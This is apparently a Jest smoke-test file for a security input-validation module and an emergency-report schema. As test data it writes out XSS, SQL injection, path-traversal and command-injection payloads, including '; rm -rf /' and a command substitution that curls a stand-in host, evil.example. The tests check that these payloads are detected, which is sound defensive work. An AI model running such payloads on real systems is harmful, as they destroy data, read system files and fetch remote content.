// Smoke tests for the security input-validation layer.
//
// These are the first tests for src/lib/security/input-validation.ts. They
// cover the core security guarantees (XSS sanitization, SQL injection,
// path traversal, command injection detection) plus the emergencyReport
// schema accept/reject behaviour. Deep edge-case coverage can follow.

import {
  InputValidator,
  inputValidator,
  VALIDATION_SCHEMAS
} from '@/lib/security/input-validation'

// The validator reports high-severity findings to the security monitor. Stub
// it so tests don't depend on the audit subsystem or spam the console.
jest.mock('@/lib/audit/security-monitor', () => ({
  securityMonitor: {
    createAlert: jest.fn()
  }
}))

const validator = new InputValidator()

// Helper: run a single string value through validation with a minimal string
// rule so security-pattern detection fires and (optionally) sanitization runs.
function scan(input: string, opts: { sanitize?: boolean } = {}) {
  return validator.validateAndSanitize(input, [
    { name: 'field', type: 'string', sanitize: opts.sanitize }
  ])
}

describe('InputValidator - XSS', () => {
  it('removes <script> tags from sanitized output', () => {
    const result = scan('<script>alert(1)</script>', { sanitize: true })
    expect(typeof result.sanitizedValue).toBe('string')
    expect(result.sanitizedValue as string).not.toMatch(/<script/i)
    expect(result.sanitizedValue as string).not.toMatch(/<\/script>/i)
  })

  it('flags a script-tag payload with an xss security flag', () => {
    const result = scan('<script>alert("xss")</script>')
    expect(result.securityFlags.some(f => f.type === 'xss')).toBe(true)
  })

  it('strips an onload event-handler payload from sanitized output', () => {
    const result = scan('<img src=x onerror=alert(1)>', { sanitize: true })
    expect(result.sanitizedValue as string).not.toMatch(/onerror/i)
  })
})

describe('InputValidator - SQL injection', () => {
  it('flags a classic OR 1=1 payload', () => {
    const result = scan("' OR 1=1 --")
    expect(result.securityFlags.some(f => f.type === 'sql_injection')).toBe(true)
  })

  it('flags a DROP TABLE payload as high or critical severity', () => {
    const result = scan('1; DROP TABLE users')
    const sqlFlag = result.securityFlags.find(f => f.type === 'sql_injection')
    expect(sqlFlag).toBeDefined()
    expect(['high', 'critical']).toContain(sqlFlag?.severity)
  })
})

describe('InputValidator - path traversal', () => {
  it('flags ../ sequences targeting /etc/passwd', () => {
    const result = scan('../../etc/passwd')
    expect(result.securityFlags.some(f => f.type === 'path_traversal')).toBe(true)
  })

  it('flags an encoded path-traversal variant', () => {
    const result = scan('%2e%2e%2f%2e%2e%2fetc%2fpasswd')
    expect(result.securityFlags.some(f => f.type === 'path_traversal')).toBe(true)
  })
})

describe('InputValidator - command injection', () => {
  it('flags shell metacharacters with an rm command', () => {
    const result = scan('; rm -rf /')
    expect(result.securityFlags.some(f => f.type === 'command_injection')).toBe(true)
  })

  it('flags a command-substitution payload', () => {
    const result = scan('$(curl http://evil.example)')
    expect(result.securityFlags.some(f => f.type === 'command_injection')).toBe(true)
  })
})

describe('emergencyReport schema', () => {
  const validReport = {
    title: 'Fire on Main Street',
    description: 'Large fire reported near the downtown intersection',
    severity: 5,
    location: { latitude: 40.7128, longitude: -74.006 },
    type_id: 1
  }

  it('accepts a well-formed report', () => {
    const result = inputValidator.validateAndSanitizeObject(
      validReport,
      VALIDATION_SCHEMAS.emergencyReport
    )
    expect(result.isValid).toBe(true)
  })

  it('rejects a report with an out-of-range severity', () => {
    const result = inputValidator.validateAndSanitizeObject(
      { ...validReport, severity: 99 },
      VALIDATION_SCHEMAS.emergencyReport
    )
    expect(result.isValid).toBe(false)
  })

  it('rejects a report with a missing required title', () => {
    const { title: _removed, ...withoutTitle } = validReport
    void _removed
    const result = inputValidator.validateAndSanitizeObject(
      withoutTitle,
      VALIDATION_SCHEMAS.emergencyReport
    )
    expect(result.isValid).toBe(false)
  })
})
